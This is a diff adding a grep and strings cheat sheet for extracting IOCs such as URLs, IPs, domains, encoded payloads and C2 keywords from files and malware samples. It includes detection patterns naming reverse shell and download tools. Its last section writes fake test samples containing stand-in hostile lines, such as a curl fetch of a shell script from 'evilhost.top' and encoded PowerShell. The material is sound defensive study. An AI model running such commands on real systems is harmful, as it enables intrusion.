@@ -1,0 +1,232 @@
+- Extract All IP Addresses:
+➤ grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' file.txt
+➤ grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' sample.log
+➤ grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' file.txt | sort -u
+
+- Extract URLs (http / https):
+➤ grep -Eo '(http|https)://[^"]+' file.txt
+➤ grep -Eo 'https?://[^ ]+' file.txt
+
+- Extract Domain Names:
+➤ grep -Eo '([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}' file.txt
+➤ grep -Eo '([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}' file.txt | sort -u
+
+- Extract Suspicious C2 Strings:
+➤ grep -Ei 'c2|command|control|beacon|callback|server' file.txt
+
+- Extract URLs + IPs + Domains Together:
+➤ grep -Eo '(https?://[^ ]+|([0-9]{1,3}\.){3}[0-9]{1,3}|([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,})' file.txt
+
+- Scan Binary Files (Malware Sample):
+➤ strings malware.bin | grep -Eo 'https?://[^ ]+'
+➤ strings malware.bin | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
+➤ strings malware.bin | grep -Eo '([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}'
+
+- Recursive Scan Directory:
+➤ grep -RIEo 'https?://[^ ]+' .
+➤ grep -RIEo '([0-9]{1,3}\.){3}[0-9]{1,3}' .
+
+- Extract With Line Numbers:
+➤ grep -En 'https?://' file.txt
+
+- Show Context Around Match:
+➤ grep -A3 -B3 'http' file.txt
+
+- Best One-Liner (Threat Hunting):
+➤ grep -Eo '(https?://[^ ]+|([0-9]{1,3}\.){3}[0-9]{1,3}|([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,})' file.txt | sort -u
+
+- Pro tip (Malware Analysis):
+➤ strings sample.bin | grep -Eo '(https?://[^ ]+|([0-9]{1,3}\.){3}[0-9]{1,3}|([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,})' | sort -u
+
+- Extract All URLs (Most Common C2 Indicators):
+➤ grep -aEo 'https?://[A-Za-z0-9./?=_-]*' sample.bin | sort -u
+
+- Extract IPv4 Addresses:
+➤ grep -aEo '([0-9]{1,3}\.){3}[0-9]{1,3}' sample.bin | sort -u
+
+- Extract Domains (Malware Beacons):
+➤ grep -aEo '([a-zA-Z0-9-]+\.)+(com|net|org|ru|cn|xyz|top|info)' sample.bin | sort -u
+
+- Detect Suspicious PowerShell Payloads:
+➤ grep -aEi 'powershell|invoke-webrequest|downloadstring|iex|base64' sample.bin
+
+- Extract Base64 Encoded Payloads:
+➤ grep -aEo '[A-Za-z0-9+/]{20,}={0,2}' sample.bin
+
+- Extract Email Addresses (Phishing / Exfil):
+➤ grep -aEo '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}' sample.bin
+
+- Detect Suspicious Windows Commands:
+➤ grep -aEi 'cmd.exe|powershell.exe|rundll32|regsvr32|schtasks|wmic' sample.bin
+
+- Find Reverse Shell Indicators:
+➤ grep -aEi 'nc |netcat|bash -i|/dev/tcp/|reverse shell' sample.bin
+
+- Extract Suspicious File Downloads:
+➤ grep -aEi '\.exe|\.dll|\.ps1|\.bat|\.vbs|\.sh' sample.bin
+
+- Full IOC Hunter (Best One-Liner):
+➤ strings sample.bin | grep -Eo '(https?://[^ ]+|([0-9]{1,3}\.){3}[0-9]{1,3}|([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,})' | sort -u
+
+- Bonus: Scan Entire Malware Directory:
+➤ grep -RIEo 'https?://[^ ]+' malware_samples/
+
+- Pro Malware Analyst Trick:
+➤ strings sample.bin | grep -Ei 'http|c2|panel|gate|api|upload'
+
+- Full IOC Extraction (Best Core Command):
+➤ strings -a sample.bin | grep -Eo '(https?://[^ ]+|([0-9]{1,3}\.){3}[0-9]{1,3}|([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,})' | sort -u
+
+- Extract URLs with Parameters (C2 APIs):
+➤ strings -a sample.bin | grep -Eo 'https?://[A-Za-z0-9./?=_-]*'
+
+- Extract Domains + Filter Suspicious TLDs:
+➤ strings sample.bin | grep -Eo '([a-zA-Z0-9-]+\.)+(xyz|top|ru|cn|su|tk|ml)' | sort -u
+
+- Extract IPs but Remove Local Noise:
+➤ strings sample.bin | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -vE '^127\.|^192\.168|^10\.'
+
+- Detect Encoded Payloads (Base64 / Obfuscation):
+➤ strings sample.bin | grep -Eo '[A-Za-z0-9+/]{30,}={0,2}'
+
+- Master IOC Extractor (All-in-One)
+➤ strings -a sample.bin | grep -Eo '(https?://[^ ]+|([0-9]{1,3}\.){3}[0-9]{1,3}|([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,})' | sort -u
+
+- Extract URLs + Clean Output
+➤ strings -a sample.bin | grep -Eo 'https?://[^ ]+' | sed 's/[",]//g' | sort -u
+
+- Domain Extraction (Strict + Clean)
+➤ strings sample.bin | grep -Eo '\b([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}\b' | sort -u
+
+- Public IPs Only (No Private Ranges)
+➤ strings sample.bin | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' \
+| grep -vE '^(127\.|10\.|192\.168|172\.(1[6-9]|2[0-9]|3[0-1]))'
+
+- Find Base64 + Decode Automatically
+➤ strings sample.bin | grep -Eo '[A-Za-z0-9+/]{40,}={0,2}' | while read line; do echo "$line" | base64 -d 2>/dev/null; done
+
+- Detect PowerShell Attack Chains
+➤ strings sample.bin | grep -Ei 'powershell|iex|downloadstring|invoke-webrequest|bypass|enc'
+
+- Windows LOLBins (Living-off-the-Land Binaries)
+➤ strings sample.bin | grep -Ei 'cmd.exe|powershell.exe|rundll32|regsvr32|mshta|wmic|schtasks'
+
+- Reverse Shell Indicators
+➤ strings sample.bin | grep -Ei 'nc |netcat|bash -i|/dev/tcp/|0>&1|sh -i'
+
+- Payload Download Patterns
+➤ strings sample.bin | grep -Ei 'wget|curl|bitsadmin|certutil|ftp'
+
+- Suspicious File Drops
+➤ strings sample.bin | grep -E '\.(exe|dll|ps1|bat|vbs|js|sh)'
+
+- C2 Keywords Hunt
+➤ strings sample.bin | grep -Ei 'c2|panel|gate|beacon|callback|upload|api'
+
+- Hardcoded Credentials / Tokens
+➤ strings sample.bin | grep -Ei 'password|passwd|token|apikey|secret|auth'
+
+- Find XOR / Obfuscation Hints
+➤ strings sample.bin | grep -Ei 'xor|encode|decode|encrypt|decrypt'
+
+- Extract Long Suspicious Strings
+➤ strings sample.bin | awk 'length($0) > 50'
+
+- Detect Packed / Compressed Malware
+➤ strings sample.bin | grep -Ei 'upx|packed|compress|stub'
+
+- Extract URLs with EXE Payloads
+➤ strings sample.bin | grep -Eo 'https?://[^ ]+\.exe'
+
+- Scan Directory (Bulk Analysis)
+➤ find . -type f -exec strings {} \; | grep -E 'http|c2|panel'
+
+- Combine Everything (Advanced Pipeline)
+➤ strings sample.bin | grep -Ei 'http|c2|panel|cmd|powershell|exe|dll|wget|curl'
+
+- Hex + Grep (Find Hidden Strings)
+➤ xxd sample.bin | grep '68747470'
+
+
+- All-in-One IOC Extractor (BEST)
+➤ strings -a file | grep -Eo '(https?://[^ ]+|([0-9]{1,3}\.){3}[0-9]{1,3}|([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,})' | sort -u
+
+- Extract URLs (C2 Links)
+➤ grep -aEo 'https?://[^ ]+' file
+
+- Cleaner: grep -aEo 'https?://[A-Za-z0-9./?=_-]*' file | sort -u
+
+- Extract IPv4 Addresses
+grep -aEo '([0-9]{1,3}\.){3}[0-9]{1,3}' file
+
+- Unique IPs: grep -aEo '([0-9]{1,3}\.){3}[0-9]{1,3}' file | sort -u
+
+- Extract Domain Names :grep -aEo '([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}' file
+
+- C2 / Malware Keywords :grep -aEi 'c2|panel|gate|beacon|callback|command|control|server|api' file
+
+- Binary Files :
+➤ strings file | grep http
+➤ strings file | grep -Eo 'https?://[^ ]+'
+
+- Extract Everything + Clean Output : strings file | grep -Eo '(https?://[^ ]+|([0-9]{1,3}\.){3}[0-9]{1,3})' | sort -u
+
+- Scan Entire Directory : grep -RIEo 'https?://[^ ]+' .
+
+- IPs: grep -RIEo '([0-9]{1,3}\.){3}[0-9]{1,3}' .
+
+- Show Line Numbers : grep -En 'http|c2|api' file
+
+- Show Context Around Match : grep -A3 -B3 'http' file
+
+- Remove Private IP Noise : grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' file | grep -vE '^127\.|^10\.|^192\.168'
+
+- Extract Suspicious Encoded Strings : grep -aEo '[A-Za-z0-9+/]{30,}={0,2}' file
+
+- Real Analyst Workflow (Use This)
+➤ strings file > out.txt
+➤ grep -Ei 'http|c2|panel|api' out.txt
+➤ grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' out.txt
+➤ grep -Eo 'https?://[^ ]+' out.txt
+
+- Important Thing:
+➤ grep -Eo 'https?://[^ ]+' sample.bin
+➤ grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' sample.bin
+➤ strings sample.bin | grep http
+➤ strings test.exe
+➤ strings test.exe | grep -Eo 'https?://[^ ]+'
+➤ strings malware_test.bin | grep -E 'http|c2|cmd|powershell'
+➤ strings malware_test.bin | grep -Eo '(https?://[^ ]+|([0-9]{1,3}\.){3}[0-9]{1,3}|([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,})'
+
+- Quick Test Binary (Easiest):
+cat <<EOF > sample.bin
+randomdata123
+http://malicious-c2.com/api
+https://evilpanel.xyz/login
+192.168.56.10
+45.77.12.90
+beacon_callback
+powershell -enc ZABvAHcAbgBsAG8AYQBk
+cmd.exe /c whoami
+attacker@evilmail.ru
+EOF
+
+- Make It Look Like a Real Binary:
+head -c 500 /dev/urandom > sample.bin
+echo "http://c2-server.xyz/panel" >> sample.bin
+echo "185.199.110.153" >> sample.bin
+echo "https://malware-download.top/payload.exe" >> sample.bin
+
+- Create a Fake .exe File:
+printf "MZFakeBinaryData http://badc2.ru/payload.exe 103.55.22.11 powershell beacon" > test.exe
+
+- Better Malware-Like Test File:
+cat <<EOF > malware_test.bin
+MZ\x90\x00FakeHeader
+http://panel.badactor.cn/gate
+https://cdn-update.xyz/dropper.exe
+91.243.45.12
+c2_server=malware-control.net
+powershell -nop -enc aGVsbG8=
+cmd.exe /c curl http://evilhost.top/shell.sh
+EOF
